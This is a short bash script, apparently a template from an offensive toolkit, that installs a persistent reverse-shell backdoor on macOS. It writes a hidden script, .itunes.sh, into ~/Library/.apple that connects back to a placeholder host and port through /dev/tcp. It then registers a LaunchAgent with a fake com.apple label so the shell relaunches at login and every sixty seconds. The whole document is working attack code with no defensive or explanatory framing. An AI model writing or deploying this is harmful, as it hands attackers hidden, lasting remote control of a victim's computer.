#!/bin/bash
mkdir ~/Library/.apple
echo '#!/bin/bash
bash -i >& /dev/tcp/__HOST__/__PORT__ 0>&1
wait' > ~/Library/.apple/.itunes.sh
chmod +x ~/Library/.apple/.itunes.sh
echo '<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.__APPNAME__</string>
<key>ProgramArguments</key>
<array>
<string>/bin/sh</string>
<string>'$HOME'/Library/.apple/.itunes.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>StartInterval</key>
<integer>60</integer>
<key>AbandonProcessGroup</key>
<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.apple.__APPNAME__.plist
chmod 600 ~/Library/LaunchAgents/com.apple.__APPNAME__.plist
launchctl load ~/Library/LaunchAgents/com.apple.__APPNAME__.plist
exit